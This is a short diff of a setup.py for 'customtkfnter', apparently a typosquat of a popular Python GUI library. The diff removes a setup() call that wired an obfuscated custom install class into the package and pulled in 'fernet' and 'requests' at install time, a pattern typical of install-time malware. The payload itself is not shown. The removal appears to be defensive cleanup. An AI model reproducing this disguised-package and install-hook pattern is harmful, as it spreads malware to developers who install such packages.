@@ -18,22 +18,5 @@ class pvvpnslmWHXxrPylXzimPjAKNHjcThnKLFmiitHBaBBeLoWZBbZNShERnHSsa(install):
             install.run(self)
 
 
-setup(
-    name="customtkfnter",
-    version=VERSION,
-    author="HwYWcIawKFJgNW",
-    author_email="iiiVq@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': pvvpnslmWHXxrPylXzimPjAKNHjcThnKLFmiitHBaBBeLoWZBbZNShERnHSsa,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         
 
